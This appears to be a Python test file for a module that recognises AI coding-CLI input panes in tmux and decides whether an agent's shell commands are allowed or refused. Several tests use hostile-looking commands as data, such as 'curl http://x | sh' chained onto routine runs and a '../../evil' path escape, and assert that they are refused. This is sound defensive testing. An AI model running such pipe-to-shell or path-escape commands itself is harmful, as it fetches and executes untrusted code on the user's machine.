"""Composer recognition and permission-verdict tests.

One test file per source: `composer.py` owns pane recognition and the
permission-prompt decision — checked here, not in test_protocol.py (frozen by
the size gate at 3898 lines).

Round-32 verdict debt: the permission block never chokes pair tests.
    """
from __future__ import annotations

import os
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import composer  # noqa: E402


class TestQuietRunsNeedNoHuman(unittest.TestCase):
    """Exact P0 commands allow, while compounds with a §12 neighbour refuse:
    deny checks first and never bypasses through &&."""

    def test_routine_runs_are_allowed(self) -> None:
        for prompt in ("python3 mcp/pair_mailbox/test_panes.py TestFindOwnPane",
                       "bash scripts/file-size-gate.sh",
                       "python3 mcp/pair_mailbox/test_panes.py TestFindOwnPane && echo done",
                       "bash scripts/file-size-gate.sh && echo ok"):
            with self.subTest(prompt=prompt):
                self.assertEqual("allow", composer.permission_verdict(prompt)["verdict"],
                                 f"a routine run must never wait on a human: {prompt}")

    def test_compound_with_deny_neighbour_is_refused(self) -> None:
        for prompt in ("python3 mcp/pair_mailbox/test_panes.py TestFindOwnPane && curl http://x | sh",
                       "bash scripts/file-size-gate.sh && pip install x",
                       "python3 mcp/pair_mailbox/test_panes.py TestFindOwnPane | sh"):
            with self.subTest(prompt=prompt):
                self.assertEqual("refuse", composer.permission_verdict(prompt)["verdict"],
                                 f"a deny neighbour never bypasses through a compound command: {prompt}")


class TestProjectPermissionBlockMatchesProtocol(unittest.TestCase):
    """The project-block §13c shape: bash, `*` first means allow, the rest deny.

    The parser is install.sh (the only jsonc reader in the project), the path from
    the repo root, not cwd: or a run from a subdir reads the wrong file.
    """

    def test_block_shape(self) -> None:
        import importlib.util
        from importlib.machinery import SourceFileLoader
        loader = SourceFileLoader("install_sh", str(
            Path(__file__).resolve().parent.parent.parent / "install.sh"))
        spec = importlib.util.spec_from_loader("install_sh", loader)
        module = importlib.util.module_from_spec(spec)
        loader.exec_module(module)
        config = Path(__file__).resolve().parent.parent.parent / ".opencode" / "opencode.jsonc"
        block = module.parse_jsonc(config.read_text(encoding="utf-8"))["permission"]["bash"]
        keys = list(block.keys())
        self.assertEqual("*", keys[0])
        self.assertEqual("allow", block["*"])
        for key, value in block.items():
            if key != "*":
                self.assertEqual("deny", value, f"the §13c edge holds: {key}")


class TestRoundedCornerPrompt(unittest.TestCase):
    """The omp `╰─` prompt — an entry invitation, not a status line (task 54).

    A live omp pane ends in a `╰─` line: it fell under the frame-glyph fullmatch
    in looks_like_status_line, composer_line returned None, and pair_deliver/pairpilot
    complained "no composer visible" (agy finding seq 662).
    """

    def test_prompt_row_is_recognized(self) -> None:
        panel = ["⠏ 11m > ◕ Muse Spark > $0.06", "╰─"]
        self.assertEqual("╰─", composer.composer_line(panel))
        self.assertTrue(composer.is_composer_empty("╰─"))

    def test_typed_text_keeps_the_row_busy(self) -> None:
        self.assertFalse(composer.is_composer_empty("╰─ hello"))


class TestPiFramedInput(unittest.TestCase):
    """The pi input frame: content between two full `───` separators.

    Pi owns no prompt marker: typed text lies between two horizontal
    separator rows, with cwd and the token line below (the `$0.003` price and
    digits make it status-like). Before the frame mark, scan fell off: the content
    line matched no returned case → the composer counted busy forever, delivery into
    pi impossible (agy finding, finding-pi-support.md; live capture gala:0.1 2026-10-10).
    """

    SEP = "─" * 73
    TOKENS = "↑22k ↓2.8k R216k CH98.3% $0.003 2.1%/1.0M (auto) muse-spark"

    def idle(self) -> list:
        return ["output top", self.SEP, self.SEP, "~/work/gala (main)", self.TOKENS]

    def busy(self) -> list:
        return ["output top", self.SEP, "worked text", self.SEP,
                "~/work/gala (main)", self.TOKENS]

    def test_idle_frame_reads_empty(self) -> None:
        line = composer.composer_line(self.idle())
        self.assertIsNotNone(line)
        self.assertTrue(composer.is_composer_empty(line))

    def test_busy_frame_reads_busy(self) -> None:
        line = composer.composer_line(self.busy())
        self.assertEqual("worked text", line)
        self.assertFalse(composer.is_composer_empty(line))

class TestFramePresenceIsLabelOnly(unittest.TestCase):
    """composer_frame_present tells invisible apart from busy-with-chrome.

    Delivery decisions never read it (None stays hands-off either way); only
    the journal label does. Critic live capture 2026-10-15: an activity line
    inside the frame reads as typed text, composer_line goes None, and the
    old label said \"invisible\" over a plainly visible frame.
    """

    def frame(self) -> list:
        return ["  │  Build auto · Step 5 Preview Free",
                "  ▌" + "█" * 50,
                "    Writing command…",
                "    " + "▁" * 20 + " esc interrupt      104.0K (10%)"]

    def test_frame_with_activity_counts_present(self) -> None:
        self.assertTrue(composer.composer_frame_present(self.frame()))

    def test_idle_frame_counts_present(self) -> None:
        self.assertTrue(composer.composer_frame_present(
            ["  ▌" + "█" * 10, "  Build auto"]))

    def test_bare_shell_counts_absent(self) -> None:
        self.assertFalse(composer.composer_frame_present(
            ["user@host:~$ ", "output line"]))

    def test_refusal_names_each_state(self) -> None:
        self.assertIn("invisible",
                      composer.ring_refusal_reason(["plain shell"], None) or "")
        self.assertIn("busy-with-chrome",
                      composer.ring_refusal_reason(self.frame(), None) or "")
        self.assertIn("busy",
                      composer.ring_refusal_reason([], "> typing") or "")
        self.assertIsNone(composer.ring_refusal_reason([], ""))


class TestTuiHintsAreNotContent(unittest.TestCase):
    """TUI hints and shortcuts in the input line — not typed text.

    OpenCode/Claude Code/Codex print "⇧⇥ to change thinking effort", "ctrl+x …"
    and alike at the input-line end. Without cleanup such a tail kept the composer
    "busy" forever: `visibly_busy` in the pilot saw work where the agent sleeps,
    never waking — one path to the silent critic in a new session (".pair/notes/
    finding.md", the idle_roles push).
    """

    HINTS = [
        "❯ ⇧⇥ to change thinking effort",
        "❯ ⇧⇥ to change model",
        "❯ ctrl+x commands",
        "❯ ↑↓ to scroll",
        "❯",
    ]

    def test_hint_tail_reads_empty(self) -> None:
        for line in self.HINTS:
            with self.subTest(line=line):
                self.assertTrue(composer.is_composer_empty(line),
                                "a TUI hint must never count as input")

    def test_real_text_after_hint_stays_busy(self) -> None:
        for line in ("❯ hello, deal with the silent critic",
                     "❯ ctrl+x does not help: text"):
            with self.subTest(line=line):
                self.assertFalse(composer.is_composer_empty(line),
                                 "real text stays text")

    def test_opencode_geometry_unchanged(self) -> None:
        panel = ["…", "  ┃  Ask anything…", "  ╹" + "▀" * 30,
                 "  ~/work/umputum:master"]
        line = composer.composer_line(panel)
        self.assertIsNotNone(line)
        self.assertTrue(composer.is_composer_empty(line),
                        "the empty opencode field means a free composer")

    def test_opencode_idle_frame_reads_empty(self) -> None:
        """A live opencode idle frame 2026-10-13: the field with the Ask hint above the
        bottom edge, below — the path and the MCP status line. The detector must
        return the hint line as empty, not the status line."""
        panel = (["  ┃", '  ┃  Ask anything… "Fix a TODO in the codebase"',
                  "  ┃", "  ┃  Build auto · xhigh",
                  "  ╹" + "▀" * 30, "  ~/work/umputum:master"]
                 + [""] * 6 + ["  ⊙ 2 MCP /mcps  2.0.28", ""])
        line = composer.composer_line(panel)
        self.assertIsNotNone(line)
        self.assertTrue(composer.is_composer_empty(line))

    def test_opencode_typed_text_reads_busy(self) -> None:
        panel = ["  ┃", "  ┃  real typed text here", "  ┃",
                 "  ╹" + "▀" * 30, "  ~/work/umputum:master"]
        self.assertIsNone(composer.composer_line(panel))

    def test_splash_logo_is_no_input_edge(self) -> None:
        """Splash art (`██ v18.11.1`) starts at a block glyph but carries
        text — it must never claim the input-field bottom edge.
        Live 2026-10-15: after auto-compact the pane sat on the splash,
        low_idx took the version line, the detector read busy, and all
        three wake channels (doorbell, deliver, pilot print) refused."""
        panel = ["  ██       v18.11.1", "",
                 "  ╰─ work  ⇧⇥ to change thinking effort"]
        line = composer.composer_line(panel)
        self.assertIsNotNone(line)
        self.assertFalse("v18.11.1" in line,
                         f"splash art claimed the edge: {line!r}")

    def test_shell_footer_with_text_below_one_rule_is_not_composer(self) -> None:
        """A lone output bar never makes the next line a composer: or text above any
        printed line would go for delivery."""
        panel = ["output", "─" * 40, "script text", "user@host:~$ "]
        self.assertNotEqual("script text", composer.composer_line(panel))




class TestPilotCoverageGaps(unittest.TestCase):
    """The routine the agent stalled on at a prompt, though the protocol allows it.

    Round-54 measure: 5 of 6 CLI profiles run a bare launch, while bun (the omp/pi
    pane runtime) and bin/ (our runners) fell out of the allowed patterns. scripts/
    was closed (composer.py:997) — the new pattern only fills these two holes.
    """

    def verdict(self, prompt: str) -> str:
        return composer.permission_verdict(prompt, composer.DEFAULT_ALLOW_PATTERNS)["verdict"]

    def test_bun_checks_are_allowed(self) -> None:
        # P0 (round 75): `bun test` runs host tests — refuse, while the rest of the
        # bun runtime (run/x) stays allow as before.
        for prompt in ("bun run build", "bun x tsc --noEmit"):
            with self.subTest(prompt=prompt):
                self.assertEqual("allow", self.verdict(prompt))
        self.assertEqual("refuse", self.verdict("bun test"))

    def test_bun_install_is_not_allowed(self) -> None:
        """bun add means package installs: the NEVER class "network drags foreign code"."""
        self.assertEqual("refuse", self.verdict("bun add left-pad"))

    def test_pair_runners_are_allowed(self) -> None:
        for prompt in ("bin/pairup --state .pair", "bash bin/pairup", "bin/pairpilot --state .pair"):
            with self.subTest(prompt=prompt):
                self.assertEqual("allow", self.verdict(prompt))

    def test_bin_escape_is_not_allowed(self) -> None:
        """Relativity and `..` guard match scripts/."""
        self.assertEqual("refuse", self.verdict("bash bin/../../evil/pairup"))
        self.assertEqual("refuse", self.verdict("/usr/local/bin/pairup"))


class TestNumberedMenuKeys(unittest.TestCase):
    """A numbered menu vs a horizontal one: the digit only on explicit allow."""

    def test_digit_goes_to_the_least_privilege_item(self) -> None:
        lines = ["Permission required", "$ git push origin main",
                 "1) Allow once   2) Always allow   3) Deny"]
        self.assertEqual("1", composer.menu_allow_key(lines))

    def test_always_allow_is_the_fallback(self) -> None:
        lines = ["Permission required", "1) Deny", "2) Always allow", "3) No"]
        self.assertEqual("2", composer.menu_allow_key(lines))

    def test_horizontal_menu_has_no_key(self) -> None:
        """The `⇆ select` menu: Enter presses the selected item, no digit — as before."""
        lines = ["Permission required", "Allow once · Always allow · Reject",
                 "⇆ select  enter confirm"]
        self.assertIsNone(composer.menu_allow_key(lines))

    def test_deny_only_menu_has_no_key(self) -> None:
        lines = ["1) Deny   2) No, and tell me why"]
        self.assertIsNone(composer.menu_allow_key(lines))


class TestTmuxTimeoutIsBusyNotDeath(unittest.TestCase):
    """A `tmux send-keys` timeout is BUSY — never the death of the caller.

    The measured death (2026-10-25, this project's own supervisor): one
    `send-keys` into a pane whose CLI had stopped consuming input hung for
    the full 5-second timeout and raised `subprocess.TimeoutExpired`. The
    pilot's `flush_outbox` caught `ComposerBusy` and nothing else, so the
    exception escaped, the whole supervisor died, and EVERY rule it carried
    went dark with it — including the monologue watchdog. A dead supervisor
    is the one failure no watchdog can notice.
    """

    def test_timeout_becomes_composer_busy(self) -> None:
        import subprocess

        def fake_run(cmd, **kwargs):
            raise subprocess.TimeoutExpired(cmd, kwargs.get("timeout", 5))

        original = composer.subprocess.run
        composer.subprocess.run = fake_run
        try:
            with self.assertRaises(composer.ComposerBusy):
                composer._send_keys("/usr/bin/tmux", "%7", "-l", "hello")
        finally:
            composer.subprocess.run = original

    def test_type_text_timeout_becomes_composer_busy(self) -> None:
        """`type_text` is on the delivery path: a timeout must not kill the pilot."""
        import subprocess

        def fake_run(cmd, **kwargs):
            raise subprocess.TimeoutExpired(cmd, kwargs.get("timeout", 5))

        original = composer.subprocess.run
        composer.subprocess.run = fake_run
        try:
            with self.assertRaises(composer.ComposerBusy):
                composer.type_text("/usr/bin/tmux", "%7", "hello")
        finally:
            composer.subprocess.run = original

    def test_submit_verified_timeout_becomes_composer_busy(self) -> None:
        import subprocess

        def fake_run(cmd, **kwargs):
            raise subprocess.TimeoutExpired(cmd, kwargs.get("timeout", 5))

        original = composer.subprocess.run
        composer.subprocess.run = fake_run
        try:
            with self.assertRaises(composer.ComposerBusy):
                composer.submit_verified("/usr/bin/tmux", "%7", "body")
        finally:
            composer.subprocess.run = original

    def test_erase_timeout_becomes_composer_busy(self) -> None:
        import subprocess

        def fake_run(cmd, **kwargs):
            raise subprocess.TimeoutExpired(cmd, kwargs.get("timeout", 5))

        original = composer.subprocess.run
        composer.subprocess.run = fake_run
        try:
            with self.assertRaises(composer.ComposerBusy):
                composer.erase("/usr/bin/tmux", "%7", 3)
        finally:
            composer.subprocess.run = original

    def test_a_working_pane_still_returns_the_result(self) -> None:
        """The wrapper is not a blanket failure: a healthy tmux still reports rc."""
        import subprocess

        done = subprocess.CompletedProcess(["tmux"], 0, "", "")

        original = composer.subprocess.run
        composer.subprocess.run = lambda cmd, **kwargs: done
        try:
            self.assertEqual(0, composer._send_keys("/usr/bin/tmux", "%7", "Enter").returncode)
        finally:
            composer.subprocess.run = original


class TestCaptureJoinsSoftWrappedLines(unittest.TestCase):
    """`capture` reads the LOGICAL line, not the terminal row.

    The defect this fixes: a pane narrower than the text split every long line
    into rows, and a regex over the pane read a fragment — a permission prompt
    split across rows never matched, so the pilot never answered it.

    The tests run on a LIVE tmux pane: stubbing the capture would prove the
    flag is spelled right, not that tmux joins the rows.
    """

    WIDTH = 40

    def setUp(self) -> None:
        from shutil import which

        if not which("tmux"):
            self.skipTest("tmux not installed")
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.source = Path(self._tmp.name) / "payload.txt"
        self.session = f"pairtestJ{os.getpid()}"
        subprocess.run(["tmux", "kill-session", "-t", self.session],
                       capture_output=True, timeout=10)
        made = subprocess.run(
            ["tmux", "new-session", "-d", "-s", self.session,
             "-x", str(self.WIDTH), "-y", "20",
             f"sh -c 'cat {self.source}; sleep 30'"],
            capture_output=True, text=True, timeout=10)
        if made.returncode != 0:
            self.skipTest(f"tmux gave no session: {made.stderr}")
        self.addCleanup(subprocess.run, ["tmux", "kill-session", "-t", self.session],
                        capture_output=True, timeout=10)
        self.pane = subprocess.run(
            ["tmux", "list-panes", "-t", self.session, "-F", "#{pane_id}"],
            capture_output=True, text=True, timeout=10).stdout.strip()
        self.addCleanup(self._write, "\n")

    def _write(self, text: str) -> None:
        """Put text on the pane and wait until the pane shows it."""
        self.source.write_text(text, encoding="utf-8")
        # The pane runs `cat` once at start; a rewrite needs a fresh cat. The
        # simplest honest way: send the text as keys to a shell prompt.
        subprocess.run(["tmux", "send-keys", "-t", self.pane, "-l", text],
                       capture_output=True, timeout=10)
        subprocess.run(["tmux", "send-keys", "-t", self.pane, "Enter"],
                       capture_output=True, timeout=10)
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            if composer.capture("tmux", self.pane):
                return
            time.sleep(0.2)

    def test_a_wrapped_line_comes_back_whole(self) -> None:
        long_line = "A" * 60
        self._write(long_line)
        lines = composer.capture("tmux", self.pane)
        self.assertIn(long_line, lines,
                      f"the wrapped line stayed split: {lines!r}")

    def test_the_frame_geometry_survives_the_joining(self) -> None:
        """A bottom edge wider than the pane must still read as the input field.

        This is the risk `-J` carries: a frame row too wide for the pane wraps,
        and the plain capture then shows the corner on the first row and the rest
        of the edge on the second — the corner-led geometry is gone, and the pane
        reads busy forever. With the joining the edge comes back whole, corner
        first, and the detector finds it again.
        """
        edge = "╹" + "▀" * (self.WIDTH + 20)
        self._write(edge + "\nstatus line below")
        lines = composer.capture("tmux", self.pane)
        self.assertIn(edge, lines,
                      f"the input-field bottom edge did not survive: {lines!r}")
        self.assertTrue(composer.is_input_box_border(edge))
        line = composer.composer_line(lines)
        self.assertIsNotNone(line,
                             f"the input field went invisible: {lines!r}")

    def test_a_wrapped_prompt_is_recognized_as_one_line(self) -> None:
        """The consumer of the fix: a prompt split by the width matches whole.

        `detect_permission_prompt` reads ONE line at a time. A prompt whose
        marker fell onto the second terminal row was invisible to it — the pilot
        sat on a permission question it could not see. The marker is pushed past
        the width on purpose, so the plain capture cannot match it.
        """
        prompt = "A" * (self.WIDTH + 5) + " [y/N]"
        self._write(prompt)
        lines = composer.capture("tmux", self.pane)
        self.assertIsNotNone(composer.detect_permission_prompt(lines),
                             f"the wrapped prompt was invisible: {lines!r}")

    def test_the_old_tmux_falls_back_to_the_plain_capture(self) -> None:
        """An old tmux without `-J` must not read as an empty pane.

        An empty capture means "no composer visible", which the caller contract
        reads as BUSY — so a missing flag would silently disable delivery
        instead of degrading to the old behaviour.
        """
        calls = []

        def fake_run(cmd, **kwargs):
            calls.append(list(cmd))
            if "-J" in cmd:
                return subprocess.CompletedProcess(cmd, 1, "", "unknown flag: -J")
            return subprocess.CompletedProcess(cmd, 0, "plain line\n", "")

        original = composer.subprocess.run
        composer.subprocess.run = fake_run
        try:
            lines = composer.capture("tmux", "%7")
        finally:
            composer.subprocess.run = original
        self.assertEqual(["plain line"], lines)
        self.assertTrue(any("-J" in cmd for cmd in calls), calls)
        self.assertTrue(any("-J" not in cmd for cmd in calls), calls)


if __name__ == "__main__":
    unittest.main(verbosity=2)
